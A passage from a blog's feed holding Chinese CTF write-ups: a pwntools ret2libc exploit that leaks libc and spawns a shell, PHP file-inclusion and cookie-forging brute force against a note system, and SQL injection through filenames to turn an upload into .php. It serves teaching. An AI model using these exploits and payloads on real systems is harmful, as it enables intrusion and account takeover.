v1</td></tr><tr><td>0x4</td><td>…</td></tr><tr><td>0x8</td><td>…</td></tr><tr><td>0x12</td><td>…</td></tr><tr><td>0x16</td><td>ESP</td></tr><tr><td>0x20</td><td>EIP</td></tr></tbody></table><p>所以这里填充 <code>20</code> 位任意字符。再用 <code>write</code> 函数的 <code>plt</code> 地址覆盖 <code>EIP</code>。</p><p>POC 如下：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/d2d4ff8440f9788d80e527c641063ff6.png" alt="跟着塔主学PWN_8"></p><p>看看 <code>qira</code> 中：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/9f2c319440cb484480a6294b4d208178.png" alt="跟着塔主学PWN_9"></p><p>看到 write 函数执行了，但是我们没给参数，所以他取到了栈里的默认值，而中间的参数是最明显的，所以我们看看中间的参数位置是多少，方便覆盖。位置是：<code>0xf6fff018</code> ，此时栈顶的地址： <code>0xf6fff008</code> 。</p><p>回到一开始。。在 <code>write</code> 函数的截图中，发现取得参数位置分别是：<code>esp+0x8</code>, <code>esp+0xC</code>,<code>esp+0x10</code>。在取参数之前还有个 <code>push</code> 操作（在 <code>write</code> 函数中，上面的截图有。。），所以取参数得实际位置 <code>+4</code>。所以分别为： <code>esp+0x8</code>，<code>esp+0x10</code>,<code>esp+14</code> 。</p><p>再看个明显点的例子：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/b87ed1aa409520af80e71538c2f30041.png" alt="跟着塔主学PWN_10"></p><p>这里尝试控制参数。。</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/9dd7510c40f3350580acd09dd69ca037.png" alt="跟着塔主学PWN_11"></p><p>简单的加法：<code>0x8+0x14 = 0x1C</code></p><hr><blockquote><p>函数调用</p></blockquote><p>ok，别忘了一开始要做的事情，就是再调用一次 <code>write</code> 函数，输出一次 <code>Welcome...</code> 那个字符串。</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/146c078840f88fbc80b5db442a028314.png" alt="跟着塔主学PWN_12"></p><hr><blockquote><p>找基地址</p></blockquote><p>我们可以直接去 <code>GOT</code> 表找 <code>write</code> 函数的地址：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/f4f94db140d1e4e8805b5fde92dabdb1.png" alt="跟着塔主学PWN_13"></p><p>在 <code>GOT</code> 表中找到了 <code>write</code> 函数：<code>0x804a01c</code>。</p><p>改一下 <code>ROP</code> 链，将 <code>write</code> 的实际函数地址打印出来：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/e48331a14064f6d680f358192a29421b.png" alt="跟着塔主学PWN_14"></p><p>可以看到输出了正确的地址。代码中上面的 <code>r.recv</code> 是用来接收一开始输出的那段 <code>welcome...</code>，但是没必要输出（ 不接收的话下面 <code>recv</code> 还是会先接收到这个字符串 ）。</p><blockquote><p>获取 <code>system</code> 地址和 <code>/bin/sh</code> 字符串</p></blockquote><p>通过 <code>ldd</code> 看看这个 <code>二进制</code> 文件用了什么链接库..</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# ldd pwnme</span><br><span class="line">linux-gate.so.1 =&gt;  (0xf77bc000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f4000)</span><br><span class="line">/lib/ld-linux.so.2 (0x565e8000)</span><br></pre></td></tr></table></figure><p><code>/lib32/libc.so.6</code> 中有我们想要的，首先是 获取 write 函数的偏移地址，这样就能获取到基地址了，可以用 <code>readelf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# readelf -a  /lib32/libc.so.6|grep write@</span><br><span class="line">   .....</span><br><span class="line">  2303: 000d9900   119 FUNC    WEAK   DEFAULT   12 write@@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>记下来，偏移地址 <code>0xd9900</code>。</p><p>接下是 <code>system</code> 函数偏移地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# readelf -a  /lib32/libc.so.6|grep system@</span><br><span class="line">  ...</span><br><span class="line">  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure><p><code>system</code> 偏移地址是 <code>0x3fe70</code>。。接下来是 <code>/bin/sh</code> ，这个字符串用来传进 <code>system</code> 函数以便获取 <code>shell</code>，这里我们用 <code>ROPgadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# ROPgadget --binary  /lib32/libc.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0015da8c : /bin/sh</span><br></pre></td></tr></table></figure><hr><blockquote><p>再发送</p></blockquote><p>接下来思考一个问题，就是纵使在发送完一次 <code>shellcode</code> 只会知道了 <code>基地址</code>。但是我们却不能再调用了。。。</p><p>在最前面提到过。<code>write</code> 函数会调用 <code>ret</code>。可以把这个理解成 <code>pop eip</code>。也就是在栈顶中取出 <code>eip</code>。。。那么栈顶是哪呢？</p><p>就是在 <code>write</code> 后以及所有参数的最前面。前面我用 <code>0x61616161</code> 替代了。。</p><p>但是又会遇到一个问题。。就是即使直接调用了 <code>system</code> 函数，函数内取参数是取的 <code>esp+0x8</code>，但是 <code>esp+0x8</code> 这个位置被 <code>write</code> 函数的 <code>0xC</code> 占用了。。</p><p>想一下是那个函数写进这段 <code>shellcode</code> 的。对，<code>main</code> 函数，我们可以调用会 <code>main</code> 函数，再调用一次 <code>shellcode</code>，只不过这次是调用 <code>system</code> 函数，而不是 <code>write</code> 函数。</p><p>(<code>main</code> 函数的位置再 <code>ida</code> 中可以找到)</p><p>完整的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&quot;192.168.1.107&quot;,4000)</span><br><span class="line"></span><br><span class="line">write_plt=0x08048370</span><br><span class="line">main=0x804847d</span><br><span class="line">print(r.recv())</span><br><span class="line"></span><br><span class="line">poc_rop1=[</span><br><span class="line">        write_plt,</span><br><span class="line">        main,</span><br><span class="line">        0x1,</span><br><span class="line">        0x804a01c,</span><br><span class="line">        4,</span><br><span class="line">]</span><br><span class="line">shellcode=&quot;a&quot;*20 + flat(poc_rop1)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">write_offset = 0xd9900</span><br><span class="line">system_offset =0x3fe70</span><br><span class="line"></span><br><span class="line">bin_bash = 0x0015da8c</span><br><span class="line"></span><br><span class="line">base = p32(int(r.recv().encode(&apos;hex&apos;),16)).encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base=int(base,16)-write_offset</span><br><span class="line"></span><br><span class="line">system = base + system_offset</span><br><span class="line">bin_str = base + bin_bash</span><br><span class="line"></span><br><span class="line">poc_rop2 = [</span><br><span class="line">        system,</span><br><span class="line">        0x61626364,</span><br><span class="line">        bin_str,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">shellcode2 = &quot;a&quot;*12 + flat(poc_rop2)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是第二次只需要填充 <code>12</code> 个 字符即可。。</p><p>效果：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/74e7080840f68cf580279c597ba60bbf.png" alt="跟着塔主学PWN_15"></p><hr><h3 id="Done…"><a href="#Done…" class="headerlink" title="Done…."></a>Done….</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这道貌似是 ISG 2015 年的题了。。&lt;/p&gt;
&lt;h4 id=&quot;本题WP&quot;&gt;&lt;a href=&quot;#本题WP&quot; class=&quot;headerlink&quot; title=&quot;本题WP&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://blog.csdn.net/csalp/article/
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸笔记管理系统（塔主nb）</title>
    <link href="https://liey1.github.io/2018/09/09/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://liey1.github.io/2018/09/09/蓝鲸笔记管理系统/</id>
    <published>2018-09-09T11:59:40.605Z</published>
    <updated>2018-09-24T12:29:30.267Z</updated>
    
    <content type="html"><![CDATA[<h4 id="蓝鲸官网"><a href="#蓝鲸官网" class="headerlink" title="蓝鲸官网"></a><a href="http://www.whaledu.com/" target="_blank" rel="noopener">蓝鲸官网</a></h4><h4 id="本题源码"><a href="#本题源码" class="headerlink" title="本题源码"></a><a href="http://bmob-cdn-21455.b0.upaiyun.com/2018/09/09/7490aba640f5756380392e7b8b4f97c6.zip" target="_blank" rel="noopener">本题源码</a></h4><hr><p>首先先随便注册个，登陆看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/cc52eff0409f44bf80c7adaf12ea54fe.png" alt="前台"></p><p>这里看到个提示一样的东西：访问 <code>/dbinit.sql</code> 拿到 数据库结构。</p><p>再看看地址，首页的 url 地址为：<br><code>http://106.39.10.134:10002/index.php?action=front&amp;mode=index</code></p><p>一开始还以为是 MVC 架构的，后来看了师傅的 WP 发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span class="string">'action'</span>];</span><br><span class="line">$mode=$_GET[<span class="string">'mode'</span>];</span><br><span class="line">$file=$action.<span class="string">'/'</span>.$mode.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的一个文件包含漏洞。用 <code>php://filter</code> 伪协议读取源码：</p><p><code>/index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index</code></p><p>但是这里读不出 <code>config.inc.php</code> 原因可以在 <code>index.php</code> 中看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if(!preg_match(&apos;/\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;])</span><br></pre></td></tr></table></figure><p>mode 中不能包含 <code>.</code></p><hr><p>共读取到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">common.php</span><br><span class="line">admin/index.php</span><br><span class="line">admin/login.php</span><br><span class="line">admin/setpagenum.php</span><br><span class="line">front/index.php</span><br><span class="line">front/login.php</span><br><span class="line">front/newnote.php</span><br><span class="line">front/register.php</span><br></pre></td></tr></table></figure></p><p>我们可以看看 <code>admin/index.php</code> 中是怎么验证是否登陆的（别问为什么一上来就看这个）：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p><p>调用了 <code>check_login</code> 和 <code>get_level</code> 函数，这两个函数在 <code>common.php</code> 中。我们先看看这个文件的开头：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/954b0b56403c004580c6b260c9279692.png" alt="公共文件开头"></p><p>很明显，这里进行了一些初始化操作。</p><p>再来看看两个验证函数：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/9dca48914066fb13807322ce25d465ab.png" alt="公共文件"></p><p>这里将 <code>cookie</code> 中的 <code>uid</code> 取出，以 <code>|</code>  分割，加密判断。</p><p>如果成功返回当前 <code>$_SESSION</code> 中的值，否则返回 <code>False</code>。如果没登陆，那此时的值为 <code>NULL</code> ，但是判断使用的是 <code>严格</code> 判断，即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(check_login()!==<span class="keyword">false</span>&amp;&amp;get_level()!==<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>这两个函数的绕过方法是一样的，所以下一步我们的目标就是研究：</p><p><code>$userinfo[1]==encode($userinfo[0])</code></p><p>这个条件怎么成立，这个数组是我们可控的，我们可以跟进 <code>encode</code> 函数中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> md5($_SESSION[<span class="string">'SECURITY_KEY'</span>].$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难理解，翻上面发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6);</span><br></pre></td></tr></table></figure><p>来看看这个函数的实现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_str</span><span class="params">($lenth=<span class="number">16</span>)</span></span>&#123;</span><br><span class="line">   $rand=[];</span><br><span class="line">   $_str=<span class="string">"wh"</span>;</span><br><span class="line">   <span class="keyword">while</span>($lenth)&#123;</span><br><span class="line">   $rand[]=$_str[rand(<span class="number">0</span>,strlen($_str)<span class="number">-1</span>)];</span><br><span class="line">   $lenth--;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//    var_dump($rand);</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> implode($rand);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p> 随机取6位 <code>w</code> 或 <code>h</code> </p><hr><p> 整理一下思路：</p><p> 要想绕过登陆验证，就要让验证函数返回 <code>NULL</code>。</p><p> 函数返回 <code>NULL</code> 的条件为：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($userinfo[1]==encode($userinfo[0]))</span><br></pre></td></tr></table></figure><p> $userinfo 是我们可以控制的，唯一不确定的是 encode 函数中用到的 <code>$_SESSION[&#39;SECURITY_KEY&#39;]</code></p><p> 因为不对，所以我们写个脚本爆破：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">lst = itertools.product(&quot;wh&quot;, repeat=6)</span><br><span class="line">url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def m(s):</span><br><span class="line">    return md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in lst:</span><br><span class="line">    key = m(&apos;&apos;.join(i) + &apos;admin&apos;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    if r.text.find(&quot;not login&quot;) &lt; 0:</span><br><span class="line">        print(headers)</span><br></pre></td></tr></table></figure><p>很快就会输出 <code>Cookie</code>，添加上浏览器，再访问 后台的 <code>index</code> 即可。。</p><blockquote><p>踩坑</p></blockquote><p>这里还有个坑，就是如果你当前的 SESSION 已经登陆过前台，那么爆破就会失败。原因可能是 <code>$_SESSION</code> 中登陆的用户的 <code>level</code> 为 0，在 <code>get_level</code> 函数中会返回 <code>False</code></p><hr><p>现在我们已经登陆了后台，看看后台的代码：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p><p>这里拼接了个 <code>get_page_size()</code>，这个函数在 <code>common.php</code> 里，我们看看这个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function get_page_size()&#123;</span><br><span class="line">      $sql=&quot;select num from page&quot;;</span><br><span class="line">      $res=mysql_my_query($sql);</span><br><span class="line">      $row=$res-&gt;fetch_assoc();</span><br><span class="line">      return $row[&apos;num&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只做了很简单的查询。</p><p>我们会发现后台页面还有个设置页面（<code>setpagenum.php</code>），进去看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/16bfd11e40309e538040b0c702fd600b.png" alt="后台设置页面"></p><p>这个设置就是 <code>get_page_size</code> 查询并返回的表和字段，猜测关键点可能就在这了（别问为什么猜）。</p><p>可以看到，这里做了 <code>is_numeric</code> 的判断，判断是否是数字。</p><p>mysql 中允许这么玩：<br><code>select 0x313233;</code></p><p>这条语句会输出 <code>123</code>，也就是 ASCII 码。</p><p>但是不允许这么玩：</p><p><code>select &#39;0x313233&#39;;</code></p><p>注意这里加了单引号，此时输出 <code>0x313133</code></p><p>我们发现这里是没有加引号的，所以我们传进来的值会在执行时解析成 ASCII 码。如果这是故意留的洞，那该字段的属性就不会是 <code>int</code>。因为 <code>int</code> 就不能存储字符串了。</p><hr><p>回顾一下查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$page_size=get_page_size();</span><br><span class="line">$sql=&quot;select * from note  limit 0,&quot;.$page_size;</span><br></pre></td></tr></table></figure><p>思考能不能用这样的语句：select * from note  limit 0,1 union select 2 </p><p>（！！！ 5.7 以后 limit 必须要放在最后，5.7以前是可以的）</p><p>5.7 以后会报：<code>ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT</code></p><blockquote><p>利用</p></blockquote><p>那么现在就可以利用了：</p><p>在 <code>mysql</code> 里运行：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/997ec5b94098030380caea6f2dd04cc9.png" alt="mysql"></p><p>这样我们就可以很方便的获得 <code>16进制</code> 了（只要转成 ASCII 就可以了）。</p><p>加上 <code>0x</code> 填上去提交：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/5fca457a40b2c53b8013764d28921f51.png" alt="填"></p><p>到前台：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/f23e901240efe71180c386fb77034312.png" alt="后台首页"></p><p>可以看到 3  和 2 被显示出来了。。看回一开始拿到的数据库结构，发现有个<code>flags</code> 表和 <code>flag</code> 字段，构造一下就可以出来了。。</p><h3 id="突然的结束，是因为懒"><a href="#突然的结束，是因为懒" class="headerlink" title="突然的结束，是因为懒"></a>突然的结束，是因为懒</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;蓝鲸官网&quot;&gt;&lt;a href=&quot;#蓝鲸官网&quot; class=&quot;headerlink&quot; title=&quot;蓝鲸官网&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.whaledu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;蓝鲸官网&lt;/a&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://liey1.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸文件管理系统（塔主nb）</title>
    <link href="https://liey1.github.io/2018/09/09/%E8%93%9D%E9%B2%B8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://liey1.github.io/2018/09/09/蓝鲸文件管理系统/</id>
    <published>2018-09-09T09:33:07.960Z</published>
    <updated>2018-09-09T13:21:59.374Z</updated>
    
    <content type="html"><![CDATA[<h4 id="蓝鲸官网"><a href="#蓝鲸官网" class="headerlink" title="蓝鲸官网"></a><a href="http://www.whaledu.com/" target="_blank" rel="noopener">蓝鲸官网</a></h4><h4 id="本题源码"><a href="#本题源码" class="headerlink" title="本题源码"></a><a href="http://bmob-cdn-21455.b0.upaiyun.com/2018/09/09/da49d35740d0a254807e4ddcdbfb47e5.zip" target="_blank" rel="noopener">本题源码</a></h4><blockquote><p>题目描述：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蓝鲸为了整理自己的工具，开发了一个文件管理系统，本来对系统的功能很满意，可是为什么总有人把蓝鲸的文件名修改了？蓝鲸找到了机智的你帮助它审计代码~</span><br></pre></td></tr></table></figure><hr><p>这题一开始直接给了源码。</p><blockquote><p>首先先看看上传的代码（uplaod.php）：</p></blockquote><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/2211237940a78ddc809f87631c995c10.png" alt="upload.php" title="1"></p><p>这里两个关键点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 限制了文件的后缀名</span><br><span class="line">2. 插入进数据库</span><br></pre></td></tr></table></figure><p>首先想想能不能这样：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/fe674eac40edd39980ec7dcbc916c2ef.png" alt="test.php" title="test.php"></p><p>这样是不行得。。因为在下面的拼接文件名的时候用的也是这个后缀：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>]; <span class="comment">//此为上传的文件名</span></span><br></pre></td></tr></table></figure></p><blockquote><p>根据题目描述，我们看看 <code>rename.php</code>：</p></blockquote><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/56324f5e40ebc80380af5a84c3636eb2.png" alt="rename.php" title="rename.php"></p><p>这里的 <code>$req</code> 在 <code>common.inc.php</code> 中是这么定义的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach(array($_GET, $_POST, $_COOKIE) as $global_var) &#123;</span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123;</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似自动解析了吧。</p><hr><blockquote><p>采坑</p></blockquote><p>假设我们上传的文件名为：<code>test.jpg</code></p><p>这无论如何都会在新文件名后加上 <code>$result[&#39;extension&#39;]</code></p><p>在这里起初想绕过 <code>rename</code> ，即类似 <code>move_uploaded_file</code> 函数一样，传入  <code>windows</code> 文件名中不允许的字符，类似：<code>newname.php.php;.jpg</code> 或者 <code>newname.php.php/.jpg</code>(两个 <code>.php</code> 是因为在第22行会对<code>$newname</code>进行一次 <code>basename</code>操作)</p><blockquote><p>但是貌似 <code>rename</code> 函数会报错（总之就是不行，原谅我看不懂内核代码）</p></blockquote><hr><blockquote><p>放弃这个想法，看了师傅的 WP 后发现：</p></blockquote><p>关键点在 23行的 <code>update</code> 语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` set `filename`=&apos;&#123;$req[&apos;newname&apos;]&#125;&apos;, `oldname`=&apos;&#123;$result[&apos;filename&apos;]&#125;&apos; where `fid`=&#123;$result[&apos;fid&apos;]&#125;</span><br></pre></td></tr></table></figure><p>$result 是在 第13行 根据传入的文件名查询出来的。</p><p>这里把 <code>oldname</code> 字段设置成了 <code>$result[&#39;filename&#39;]</code>。</p><h5 id="这里的-result-‘filename’-我们是可控的，且没有做任何过滤。"><a href="#这里的-result-‘filename’-我们是可控的，且没有做任何过滤。" class="headerlink" title="这里的 $result[‘filename’] 我们是可控的，且没有做任何过滤。"></a>这里的 $result[‘filename’] 我们是可控的，且没有做任何过滤。</h5><p>虽然传入的时候经过了 addslashes 的过滤（在 common.inc.php 中），但是查询出来后却没有过滤。</p><p>可控有什么用呢？<br>前面分析过这里最大的问题在改的新名字会被强制加上 <code>$result[&#39;extension&#39;]</code>。但是这里是可以注入的，所以只要我们的文件名够骚，我们就能操作 <code>update</code> 语句，我们就可以将 <code>extension</code> 字段覆盖为空。</p><p>比如：<code>&#39;,extension=&#39;&#39;,filename=&#39;test.jpg</code>（最后要为 <code>.jpg</code> ）</p><p>此时数据库和文件夹里的情况：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d8d5dc2c40e738a380f2947902dcb9cb.png" alt="ans" title="ans"></p><p>此时去改名，传入文件名：<code>&#39;,extension=&#39;&#39;,filename=&#39;test</code>(去掉后缀)<br>新文件名传入：test</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/a91a00d1407f8a8380ae75892b9499fb.png" alt="new" title="new"></p><p>此时的sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql：update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test&apos; where `fid`=2</span><br></pre></td></tr></table></figure></p><p>再看看：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/60f7deec404c8b818043914aa7eab397.png" alt="new2" title="new2"></p><p>ok，成功踩坑。此时发现数据中的 filename 和 文件夹中的不同。下次 <code>rename</code> 的时候会找不到 <code>test</code> 文件（此时数据库中的 <code>extension</code> 已经为空）</p><h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><p>我们把上传的文件名改改：<code>&#39;,extension=&#39;&#39;,filename=&#39;test.jpg.jpg</code></p><p>此时的语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test.jpg&apos; where `fid`=3</span><br></pre></td></tr></table></figure></p><p>会发现把 <code>filename</code> 设置成了 <code>test.jpg</code> 了，此时数据库与文件夹一致（不想截图了。。）</p><p>再改次名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oldname：test.jpg</span><br><span class="line">newname：test.php</span><br></pre></td></tr></table></figure></p><p>即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;蓝鲸官网&quot;&gt;&lt;a href=&quot;#蓝鲸官网&quot; class=&quot;headerlink&quot; title=&quot;蓝鲸官网&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.whaledu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;蓝鲸官网&lt;/a&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nothing。。。</title>
